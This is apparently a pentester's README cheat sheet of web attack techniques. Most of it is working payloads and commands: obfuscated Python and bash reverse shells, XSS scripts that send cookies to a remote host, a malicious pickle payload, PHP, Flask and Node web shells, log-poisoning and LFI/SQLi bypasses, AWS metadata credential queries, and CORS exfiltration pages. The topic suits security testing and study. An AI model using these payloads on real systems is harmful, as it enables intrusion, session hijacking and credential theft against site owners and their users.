# Tricks - Web Penetration Tester

[x] In construction...

## What WAF does the application have?
<img class="center" height="450em" src="https://user-images.githubusercontent.com/54555784/188950014-db9eae26-8801-4f68-a673-01f0d7af5c15.png" />

### Tools - Detection WAF
-> wafw00f  
https://github.com/EnableSecurity/wafw00f

-> nmap --script=http-waf-fingerprint  
https://nmap.org/nsedoc/scripts/http-waf-fingerprint.html

-> imperva-detect  
https://raw.githubusercontent.com/vmfae-iscteiulpt/imperva-detect/master/imperva-detect.sh

### Finding the direct IP address of a server

-> IP History  
https://www.iphistory.ch/en/  

-> DNS History  
https://github.com/vincentcox/bypass-firewalls-by-DNS-history

-> Bypass to find real IP in CloudFlare  
https://github.com/zidansec/CloudPeler  

### Bypass using cipher not supported by WAF
`python abuse-ssl-bypass-waf.py -thread 4 -target <target>`  
https://github.com/LandGrey/abuse-ssl-bypass-waf  
`curl --ciphers <cipher> -G <test site> -d <payload>`  

-> Other Doc    
https://github.com/0xInfection/Awesome-WAF

## Host Obfuscation

<img height="400em" src="https://user-images.githubusercontent.com/54555784/188947375-6cb16b30-369c-4831-b783-47565623827b.png" />

e.g. (127.0.0.1)  
-> Octal  
0177.0000.0000.0001  
-> Hex  
0x7F000001  
-> Integer  
2130706433  
-> Hybrid  
0177.0.0x00.0001  

-> Online tool    
https://www.silisoftware.com/tools/ipconverter.php

## PHP Obfuscation Techniques:

### Mix - Hex + Octal

`echo "T\x72\x69\143\153s";#Tricks`

### Variable Parsing
`$a = "ri"; $b ="ck"; echo "T$a[0]$a[1]$b[0]$b[1]s";#Tricks`

### Variable Variables
`$a = "T"; $$a = "ri"; $$$a = "cks"; echo $a.$T.$ri;#Tricks`

### PHP Non-Alphanumeric 
`$\_="{"; #XOR char`

`echo $\_=($\_^"<").($\_^">").($\_^"/"); #XOR = GET`  

https://web.archive.org/web/20160516145602/http://www.thespanner.co.uk/2011/09/22/non-alphanumeric-code-in-php/

### PHP Bypass - disable_functions

#### Functions
-> shell_exec  
```
<?php echo shell_exec($_GET['ok']);?>
```
-> system  
```
<?php system($_GET['ok']);?>  
```
-> exec  
```
<?php echo exec($_GET['ok']);?>  
```
-> scandir  
```
<?php foreach(scandir($_GET['ok']) as $dir){echo "<br>";echo $dir;};?>
```
-> file_get_contents  
```
<?php file_get_contents($_GET['ok']);?>
```
### PHP Obfuscation - base64+gzdeflate

https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/obfuscation/obfuscation.php

## Online PHP Executor

"3v4l.org (leetspeak for eval) is an online shell that allows you to run your code on my server. I compiled more than 250 different PHP versions (every version released since 4.3.0) for you to run online."

https://3v4l.org/  

### PHP Obfuscation Decoders 

https://malwaredecoder.com/  
https://hackvertor.co.uk/public

### Spoofing Internal IP in Request Header

```
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
```
### Reverse Shell Obfuscator
e.g.  
`python hackshell.py --payload python --lhost 192.168.0.20 --lport 443 --type hex`  
```
py$()thon -$()c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0xC0A80014",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```
`python hackshell.py --payload python --lhost 192.168.0.20 --lport 443 --type octa`  
```
py$()thon -$()c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0300.0250.0000.0024",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
```  
`python hackshell.py --payload python --lhost 192.168.0.20 --lport 443 --type long`  

```
py$()thon -$()c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("3232235540",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```  
`python hackshell.py --payload python --lhost 192.168.0.20 --lport 443 --type urle`  
```
py%24%28%29thon%20%24%28%29c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22192.168.0.20%22%2C443%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22sh%22%29%27
```
`python hackshell.py --payload python --lhost 192.168.0.20 --lport 443 --type b64`  
```
cHkkKCl0aG9uIC0kKCljICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTkyLjE2OC4wLjIwIiw0NDMpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKCJzaCIpJw==
```
`
python hackshell.py --payload bash --lhost 192.168.0.20 --lport 443 --type jlre
`
```
bash -c {echo,YmEkKClzaCAtJCgpaSAnL2Rldi90Y3AvMTkyLjE2OC4wLjIwLzQ0MyAwPiYxJw==}|{base64,-d}|{bash,-i}
```

https://github.com/rodolfomarianocy/hackshell  

## Cross-Site Scripting (Reflected, Stored, DOM, Mutation, Poliglote)

### XSS Protection
-> XSS Auditor and XSS Filter  
https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md  
https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html  
https://www.chromium.org/developers/design-documents/xss-auditor/  
https://portswigger.net/daily-swig/xss-protection-disappears-from-microsoft-edge  
https://developer.mozilla.org/pt-BR/docs/Web/HTTP/Headers/X-XSS-Protection

-> Wordlists for XSS Bypass  
https://gist.githubusercontent.com/rvrsh3ll/09a8b933291f9f98e8ec/raw/535cd1a9cefb221dd9de6965e87ca8a9eb5dc320/xxsfilterbypass.lst  
https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/XSS-Bypass-Strings-BruteLogic.txt  
https://raw.githubusercontent.com/payloadbox/xss-payload-list/master/Intruder/xss-payload-list.txt  
https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/XSS-Cheat-Sheet-PortSwigger.txt

### XSS Keylogger

https://rapid7.com/blog/post/2012/02/21/metasploit-javascript-keylogger/  
https://github.com/hadynz/xss-keylogger

### XSS Mutation

http://www.businessinfo.co.uk/labs/mxss/

### XSS Poliglote

https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot

### Regex Blacklist Filtering

-> Filter blocking on - Bypass  
`(on\w+\s*=)`  
```
<svg onload%09=alert(1)> 
<svg %09onload%20=alert(1)>
<svg onload%09%20%28%2C%3B=alert(1)>
<svg onload%0B=alert(1)>
```  

### Keyword Based in Filter
 
#### Alert Blocked - Bypass
  
```
<script>\u0061lert(1)</script>
<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
<script>eval("\u0061lert(1)")</script>  
<script>eval("\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029")</script>
```

#### Removing script Tag - Bypass
  
`<sCR<script>iPt>alert(1)</SCr</script>IPt>`

### Scaping Quote
### Methods
  
-> String.fromCharCode()  
-> unescape  

e.g.  
-> decode URI + unescape method (need eval)  
`decodeURI(/alert(%22xss%22)/.source)`  
`decodeURIComponent(/alert(%22xss%22)/.source)`  
 
### Other bypass techniques

-> unicode  
`<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)"/>`  

Add execution sink:  
-> eval  
-> setInterval  
-> setTimeout  

-> octal  
`<img src=x onerror="eval('\141lert(1)')"/>`  
-> hexadecimal  
`<img src=x onerror="setInterval('\x61lert(1)')"/>`  
-> mix  (uni, hex, octa)  
`<img src=x onerror="setTimeout('\x61\154\145\x72\164\x28\x31\x29')"/>`  

https://checkserp.com/encode/unicode/  
http://www.unit-conversion.info/texttools/octal/  
http://www.unit-conversion.info/texttools/hexadecimal/  

### Other Examples
#### HTML Tag

```
<div>here</div>
```
->  
`<svg/onload=alert(1)`

#### HTML Tag Attributes

```
<input value="here"/></input>
```
 
->  
`" /><script>alert(1)</script>`
  
#### Script Tag
  
```
<script>
    var name="here";
</script>
```
  
->  
`";alert(1);//`

#### Event Attributes

`<button onclick="here;">Okay!</button>`

->  
`alert(1)`

Dom Based
  
```
<script>var ok = location.search.replace("?ok=", "");domE1.innerHTML = "<a href=\'"+ok+"\'>ok</a>";</script>
```
  
->  
`javascript:alert(1)`

### JavaScript Encoding

-> jjencode  
https://utf-8.jp/public/jjencode.html   
-> aaencode  
https://utf-8.jp/public/aaencode.html  
-> jsfuck  
http://www.jsfuck.com/  
-> Xchars.js  
https://syllab.fr/projets/experiments/xcharsjs/5chars.pipeline.html  

### Decoder - Obfuscation (Javascript Decoder and PHP)

https://malwaredecoder.com/  

## XSS - Session Hijacking

-> Examples
  
`<script type="text/javascript">document.location="http://ip/?cookie="+document.cookie;</script>`  
`<script>window.location="http://ip/?cookie="+document.cookie;</script>`  
`<script>document.location="http://ip/?cookie="+document.cookie;</script>`  
`<script>fetch('https://ip/?cookie=' + btoa(document.cookie));</script>`  

## Type Juggling

https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf

### PHP - others tricks

[ eval () execute a chain whose variable $ HTTP_USER_AGENT is so just
change your header in PHP code ]  
https://www.exploit-db.com/papers/13694

## Insecure Deserialization 
-> Binary  
-> Human-Readable  

### PHP Deserialization
#### PHP - Method Serialization:

-> serialize()  
-> unserialize()  

#### Magic Methods:

-> __construct()  
-> __destruct()  
-> __wakeup()  

#### Class Properties

Examples:

Public \<s>  
`O:4:"Okay":1:{s:8:"filepath";s:11:"/tmp/ok.txt";}`
  
Protected \0 * \0  
`O:4:"Okay":1:{s:11:"' . "\0" . '*' . "\0" . 'filepath";s:11:"/tmp/ok.txt";}`

Private \0 \<s> \0    
`O:4:"Okay":1:{s:14:"' . "\0" . 'Okay' . "\0" . 'filepath";s:11:"/tmp/ok.txt";}`
  
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/deserialization/php/example.php
  
#### Trick Bypass

`a:2:{s:8:"anything";o:4:"Okay":1:{s:8:"filepath";s:11:"/tmp/ok.txt";}}`

### Tool

https://github.com/ambionics/phpggc
  
### Other

https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/deserialization/php/token_hmac_sha1.php

### .NET Deserialization
#### Methods Serialization:

-> Binary Formatter  
-> DataContractSerializer  
-> NetDataContractSerializer  
-> XML Serialization  
  
#### Most common places to find serialized data

-> VIEWSTATE  
-> .NET remoting services  

#### Identify

-> Detect via Response Simple in SOAP Message
```
POST /endpoint HTTP/1.1
Host: ip:port

<SOAP:Envelope>
</SOAP:Envelope>
```

`ysoserial.exe -f SoapFormatter -g TextFormattingRunProperties -c "cmd /c ping ip" -o raw`  
https://github.com/pwntester/ysoserial.net  
```
POST /endpoint HTTP/1.1
Host: ip:port
SOAPAction: something
Contet-Type: text/xml

<payload_ysoserial_here_without_<SOAP-ENV:Body>
```
`tcpdump -i tap0 icmp`

### Java Deserialization

#### Identify

-> import java.io.serializable

-> binary with ac ed 00 05

-> base64 starts with rO0AB in web applications
  
#### Java Lang Runtime Exec - java.lang.Runtime.exec()
  
bash -c {echo,payload_base64}|{base64,-d}|{bash,-i}  
https://www.bugku.net/runtime-exec-payloads/

`python hackshell.py --payload bash --lhost 192.168.0.20 --lport 443 --type jlre`  
```
bash -c {echo,YmEkKClzaCAtJCgpaSAnL2Rldi90Y3AvMTkyLjE2OC4wLjIwLzQ0MyAwPiYxJw==}|{base64,-d}|{bash,-i}
```
https://github.com/rodolfomarianocy/hackshell
#### Tools
https://github.com/frohoff/ysoserial  
https://github.com/NickstaDB/SerializationDumper  
https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java
  
#### Script

```
while read payload; 
do echo "$payload\n\n"; 
java -jar ysoserial.jar $payload "sleep 5" | base64 | tr -d '\n' > $payload.ser;  
echo "-----------------Loading-----------------\n\n"; done < payloads.txt
```
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/deserialization/java/gserial.sh  
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/deserialization/java/payloads.txt

#### Signals
  
-> Bad Sign  
ClassNot FoundException

-> Good Sign  
java.io.IOException
  
#### JRMPListener and JRMPClient (CommonsCollections)
  
`java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 80 CommonsCollections “curl http://ip:port/shell.php -o /var/www/shell.php”`  
`java -jar ysoserial-all.jar “JRMPClient” ip:80” |base64 -w0`
  
### Python Deserialization

#### Pickle
```
import pickle
import os
from base64 import b64decode,b64encode

class malicious(object):
    def __reduce__(self):
        return (os.system, ("/bin/bash -c \"/bin/sh -i >& /dev/tcp/ip/port 0>&1\"",))

ok = malicious()
ok_serialized = pickle.dumps(ok)
print(b64encode(ok_serialized))
```
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/deserialization/python/py_pickle.py

### YAML Deserialization
  
`!!python/object/apply:os.system ["sleep 5"]`  
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/deserialization/yaml/exploit.yaml
  
## Cloud

### Serverless Injection

`echo "hi" > ok.txt && aws s3 cp ok.txt 's3://<BUCKET>/' -acl -public-read`

### Meta-data

`curl http://169.254.169.254/latest/api/token`

`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`   

-> Models  
`http://<BUCKETNAME>.s3.amazonaws.com/`
or  
`http://s3.amazonaws.com/<BUCKETNAME>/`
```
export AWS_ACCESS_KEY_ID=<access_key_id>   
export AWS_SECRET_ACCESS_KEY=<secret_access_key>  
export AWS_SESSION_TOKEN=<session_token>  

aws sts get-caller-identity  
aws iam get-user  
aws sts get-session-token
aws s3 ls s3://<bucket> --no-sign-request  
aws ec2 describe-instances
```
```
aws configure --profile myprofile  
aws sts get-access-key-info --access-key-id AKIA...    
aws sts get-caller-identity --profile myprofile  
aws ec2 describe-instances  --profile myprofile

```
```
aws secretsmanager list-secrets --profile myprofile --region=us-east-1  
aws secretsmanager get-secret-value --secret-id <secret> --profile myprofile --region=us-east-1
```
### EKS

```
aws eks list-clusters --region us-east-1  
aws eks describe-cluster --name <name_cluster> --region us-eas-1  
aws eks update-kubeconfig --region us-east-1 --name <name_cluster>  
./kubectl get pods  
./kubectl describe pods <name_pods>  
./kubectl get pods --all-namespace
```
### Tools

https://github.com/clarketm/s3recon  
https://github.com/RhinoSecurityLabs/pacu
  
## XPATH
  
`error()`  
`* and doc('http://hacker.site/')`  
`* and doc('http://hacker.site/', name(/*) ))`  
  
### Tool
  
https://xcat.readthedocs.io/en/latest/
  
### Wordlists for SQLI e XPath - Authentication Bypass

https://raw.githubusercontent.com/payloadbox/sql-injection-payload-list/master/Intruder/exploit/Auth_Bypass.txt

## LDAP query and LDAP Injection

### LDAP Injection - Bypass Login

```$filter = "(&(uid=$username)(userPassword=$password))";```  
`https://site.com/admin.php?username=*&password=*`  
or  
`https://site.com/admin.php?username=admin)(userPassword=*))%00&password=blabla`  

-> Other

`https://site.com/item?objectClass=*`  
`(&(sn=administrator)(password=*))`  
`*))%00`  

### LDAP Query
`nmap -p 389,636 --script ldap-* 192.168.191.132`  
or  
`ldapsearch -x -H ldap://ip -D "cn=<cn>,dc=<dc>,dc=<dc>" -w <password>  -s base namingcontexts`  
`ldapsearch -x -H ldap://ip -D "cn=<cn>,dc=<dc>,dc=<dc>" -w <password>  -b "dc=<dc>,dc=<dc>`  
https://github.com/dinigalab/ldapsearch

### Docs
  
https://tldp.org/HOWTO/archived/LDAP-Implementation-HOWTO/schemas.html  
https://book.hacktricks.xyz/pentesting-web/ldap-injection

## Attacking OAuth
 
### Workflow OAuth Authorization Code Grant Type

1- 
  
```
GET /authorization?client_id=<client_id>&redirect_uri=https://site.com/callback&response_type=code&scope=openid%20profile%20email HTTP/1.1  
Host: site.com
```
2-
  
```
GET /callback?code=<code> HTTP/1.1
Host: site.com
```
Vulnerability Forced OAuth profile linking
  
-> CSRF
```
<html>
	<body>
      		<form action="http://site.com/callback?code=<code>" method="GET">
		</form> 
	</body>
	<script>
		document.forms[0].submit();
	</script>
</html>
```  

Vulnerability Code Stealing

-> Open Redirect (redirect_uri)
```
https://site.com/authorization?client_id=%3Cclient_id%3E&redirect_uri=http://attacker.com/callback&response_type=code&scope=openid%20profile%20email
```
3-
```
POST /token HTTP/1.1
Host: oauth.server.com

client_id=<client_id>&client_secret=<client_secret>&redirect_uri=https://site.com/callback&grant_type=authorization_code&code=<code>
```
Vulnerability Brute-Force the Client Secret

```
POST /token 
Host: site.com
Content-Type: application/x-www-form-urlencoded  

client_id=\<client_id>&client_secret=\<BRUTE_FORCE>&redirect_uri=http%3A%2F%2Fip%2Fcallback&grant_type=authorization_code&code=<code>
```  
4-
```  
{
    "access_token": "<access_token>",
    "token_type": "Bearer",
    "expires_in": 3600,
    "scope": "openid profile"
}
```

5-
```  
GET /userinfo HTTP/1.1  
Host: oauth.server.com  
Authorization: Bearer <token>
```

6- 
```
{
    "username":"user",
    "email":"user@ok.com"
}
```

## Padding Oracle Attack
  
### Identify

-> rememberMe: (Cookie)

### Exploiting 

`java -jar ysoserial.jar CommonsBeanutils1 "touch /tmp/success" > payload.class`  
https://github.com/frohoff/ysoserial

`python shiro_exp.py site.com/home.jsp cookie payload.class`  
https://github.com/wuppp/shiro_rce_exp/blob/master/shiro_exp.py
  
## Hash Length Extension Attack

-> Identify  
https://site.com/index.php?file=oktest&hash=hash

-> Exploitation  
1-  
`./hash_extender -f sha1 --data 'oktest' -s hash --append '../../../../../../../../../etc/passwd' --secret-min=10 --secret-max=40 --out-data-format=html --table > payloads.out`  
https://github.com/iagox86/hash_extender

2-  
burp intruder -> payloads.out in file parameter.  

## MD5 Collision and others

https://github.com/JohnHammond/ctf-katana#php

## Insecure - Machine Key for RCE 

https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/deserialization/exploiting-__viewstate-parameter.md  
https://github.com/pwntester/ysoserial.net  
https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper
  
### Other Docs

https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/

## Local File Inclusion - LFI

### Types

#### Common

`/etc/passwd`  
`../../../../etc/passwd`

#### Replace ../

$language = str_replace('../', '', $_GET['file']);  
`/....//....//....//....//etc/passwd`  
`..././..././..././..././etc/paswd`  
`....\/....\/....\/....\/etc/passwd`  

#### Block . and /

-> urlencode and Double urlencode

/etc/passwd:

`%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64`  
`%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34`
  
#### PHP Wrappers

`data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id`  
`expect://id`  
`php://filter/read=convert.base64-encode/resource=index.php`  
`php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini`

#### Filter PHP

-> Predefined Paths

preg_match('/^\.\/okay\/.+$/', $_GET['file'])

`./okay/../../../../etc/passwd`  

#### Bypass Extension PHP - Null Bytes

`/etc/passwd%00.php`

-> Removing .php
  
`https://site.com/index.php?file=index.p.phphp`  
  
#### LFI + File Upload

-> gif

`echo 'GIF8\<?php system($_GET["cmd"]); ?>' > ok.gif`  
https://github.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/blob/main/codes/webshells/shell.gif  

-> Zip

1- 
`echo '<?php system($_GET["cmd"]); ?>' > ok.php && zip wshell_zip.jpg ok.php`  
2- 
`http://ip/index.php?file=zip://./uploads/wshell_zip.jpg%23ok.php&cmd=id`  
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/webshells/wshell_zip.jpg  

#### Log Poisoning
 
-> apache

`nc ip 80`  
  
`<?php system($_GET[‘cmd’]); ?>`  
  
or
  
`curl -s http://ip/index.php -A '<?php system($_GET[‘cmd’]); ?>'`  
  
http://ip/index.php?file=/var/log/apache2/access.log&cmd=id
  
-> mail

`telnet ip 23`  
`MAIL FROM: email@gmail.com`    
`RCPT TO: <?php system($_GET[‘cmd’]); ?>`  
`http://ip/index.php?file=/var/mail/mail.log&cmd=id`  
  
-> ssh
  
`ssh \‘<?php system($_GET[‘cmd’]);?>’@ip`  
  
`http://ip/index.php?file=/var/log/auth.log&cmd=id`  

-> PHP session

`http://ip/index.php?file=<?php system($_GET["cmd"];?>`  
`http://ip/index.php?file=/var/lib/php/sessions/sess_<your_session>&cmd=id`  
  
-> Other Paths  
`/var/log/sshd.log`  
`/var/log/vsftpd.log`  
`/proc/self/fd/0-50`
  
### LFI - files for fuzzing

### Wordlist LFI - Linux

https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt

### Wordlist LFI - Windows

https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt

### Payloads for bypass:

-> bypass_lfi.txt  
https://github.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/blob/main/wordlists/lfi_bypass.txt

### Wordlist for parameter fuzzing
  
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt

## SQL Injection
  
### WAF BYPASS

#### Query default:

`'UNION SELECT 1,name,3,4 from users; -- -`

#### Add comment /* */ for space bypass

`'UNION/\*\*/SELECT/\*\*/1,name,3,4/**/from/**/users; -- -`

#### Add comment /\*!\*/ in query for filters bypass

`'/\*!UNION SELECT\*/ 1,group_concat(name),3,4 from users; -- -`

#### Add random case

`'UnIoN SeLeCt 1,GrOuP_cOnCaT(nAme),3,4 FrOm users; -- -`

#### Example of mix:

`'/\*!UnIoN/\*\*/SeLeCt/\*\*/\*/1,GroUp_ConCat(nAmE),3,4/\*\*/FrOm/\*\*/users; -- -`

#### Other Techniques:

-> urlencode (example:%20 instead of space);
  
-> Scientifc Notation;
  
-> hexadecimal, substr, etc...
  
### Webshell via SQLI
`LOAD_FILE('/etc/httpd/conf/httpd.conf')`    
`select "<?php system($_GET['cmd']);?>" into outfile "/var/www/html/shell.php";`
  
### SQL Injection Second-Order (query connector)

-> script.php

https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/sqli/second-order/script.php

### Webshell via redis

`redis-cli -h ip`  
`config set dir /var/www/html`  
`config set dbfilename ok.php`  
`set test "\<?php system($_GET['okay'); ?>"`  
`save`

#### Study

https://tryhackme.com/room/sqlilab

### Webshell Infecting views.py - Python (Flask)
```
import os
from flask import Flask,request,os

app = Flask(__name__)
   
@app.route('/okay')
def cmd():
    return os.system(request.args.get('c'))

if __name__ == "__main__":
	app.run()
```
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/webshells/views.py
	
### Webshell infecting views.js -> nodejs
```
const express = require('express')
const app = express();

app.listen(3000, () => 
	console.log('...')
);
function Exec(command){ 
	const { execSync } = require("child_process");
	const stdout = execSync(command);
	return "Result: "+stdout
}
app.get('/okay/:command', (req, res) => 
res.send(Exec(req.params.command))
);
```
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/webshells/views.js

### SQL Injection Out-Of-Band, etc

https://book.hacktricks.xyz/pentesting-web/sql-injection
  
### Tamper's SQLMAP
  
-> randomcase.py
  
-> order2ascii.py

-> xforwardedfor.py
 
### XPATH NOTATION
  
`%' and extractvalue(0x0a,concat(0x0a,(select database() limit 1))) -- -`
  
### Wordlist for SQL Injection - Bypass

https://gist.githubusercontent.com/zetc0de/f4146eb278805946ab064a753eac6a02/raw/e126452093b9cde7f82eff14a15f8ceca8188701/sqli-bypass-waf.txt

### Doc for SQL Injection - Bypass

https://github.com/OWASP/www-community/blob/master/pages/attacks/SQL_Injection_Bypassing_WAF.md
  
### Other
  
-> sqli.py  
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/sqli/time-based/sqli.py
  
-> second-order.py  
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/sqli/tampers/second-order.py
  
## NOSQL Injection

-> Auth bypass  
username=test&password=test  
username=admin&password[$ne]=abc  
username=admin&password[$regex]=^.{6}$  
username=admin&password[$regex]=^a.....  
  
## Graphql Introspection

https://ivangoncharov.github.io/graphql-voyager/
  
## CSRF

-> csrf.html  
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/csrf/csrf.html
  
-> csrf_json.html  
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/csrf/csrf_json.html
  
-> csrf_json_xhr.html  
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/csrf/csrf_json_xhr.html
  
-> csrf_token_bypass.html  
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/csrf/csrf_token_bypass.html
  
### Analyze the token and perform brute-force

1-  
`burp intruder -> sequencer -> Token Location Within Response -> Start live capture -> save tokens`

2-  
`cat tokens.txt | uniq -c | nl`  

## SSTI

### Identify

-> Jinja2 or Twig
  
`{{3*3}}`

-> Smarty or Mako
  
`{3*3}`

-> ERB(Ruby)
  
`<%= 7*7 %>`

-> FreeMarker
  
`#{3*3}`

-> Other  
    
`${3*3}`
  
`${{3*3}}`

`3*3`

### Java Expression Language

`{{T(java.lang.Runtime).getRuntime().exec('id')}}`
`''.class.forName('java.lang.Runtime').getRuntime().exec('id')`

### FreeMarker

`<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}`

### Python - Secret Key
  
`{{settings.SECRET_KEY}}`
  
### Doc for SSTI	

https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
  
## SSRF - Protocol Smuggling

-> HTTP-Based(Elastic, CouchDB, Mongodb, docker),etc.

-> Text-Based(ftp(21), smtp(587), zabbix(10051), mysql(3306), redis(6379), memcached(11211), etc.

gopher://127.0.0.1:port/_

### Scripts

-> memcached.py  
`stats items`  
`stats cachedump <slab class> <number of items to dump>`  
`get <item>`  
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/ssrf_protocol_smuggling/memcached.py 

-> zabbix.py  
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/ssrf_protocol_smuggling/zabbix.py

### Tool's

-> Gopherus  
https://github.com/tarunkant/Gopherus
  
### Docs for SSRF

https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf  
https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery

## Insecure RMI
-> Example:  
//Open port Java RMI 9991  
`jython sjet.py 192.168.11.136 9991 password install http://192.168.11.132:8000 8000`  
`jython sjet.py 192.168.11.136 9991 password command "ls -la"`  
https://github.com/siberas/sjet  
http://search.maven.org/remotecontent?filepath=org/python/jython-standalone/2.7.0/jython-standalone-2.7.0.jar  

## Null Origin Exploitation

-> Identify - Response
```
HTTP/1.1 200 OK  
...  
Access-Control-Allow-Origin: null  
Access-Control-Allow-Credentials: true
```

### Common
-> nullorigin.html  
```
<html><head>
<script>
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
	if (xhr.readyState == XMLHttpRequest.DONE) {
	var r = xhr.responseText;
	alert(r)
	}
}
xhr.open('GET', 'http://site.com/admin.php', true);
xhr.withCredentials = true;
xhr.send(null);
</script>
</head></html>

``` 

### Null Origin Exploitation Exfiltrate via url per server

-> nullorigin2.html
```
<html><head>
<script>
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
	if (xhr.readyState == XMLHttpRequest.DONE) {
 		var r = xhr.responseText;
		var d = r.split('>')[1].split('<')[0]
		function exfil() {
			document.write('<img src="http://your-ip:your-port/log.php?data=' + d + '"/>');
	}
	exfil();
	}
}
xhr.open('GET', 'http://site.com/admin.php', true);
xhr.withCredentials = true;
xhr.send(null);
</script>
</head></html>
```  

### Null Origin Exploitation Exfiltrate via url per server + base64
-> nulloriginb64.html
```

<iframe src="data:text/html;base64,<YOUR_BASE64_HERE>"></iframe>
</head></html>
```

## CRLF Injection
  
`/%0d%0aLocation:attacker`  
`/%0d%0a%0d%0a\<svg onload=(0)>`

## Elasticsearch - API

-> Extract info  
http://10.10.57.49:9200/_cat/indices?v  
http://10.10.57.49:9200/<indice>  
http://10.10.57.49:9200/_search?pretty=true&q=pass  

## XXE

### Methods:

`<!ENTITY % file SYSTEM "file:///etc/passwd">`  
`<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">`  
`<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">`  

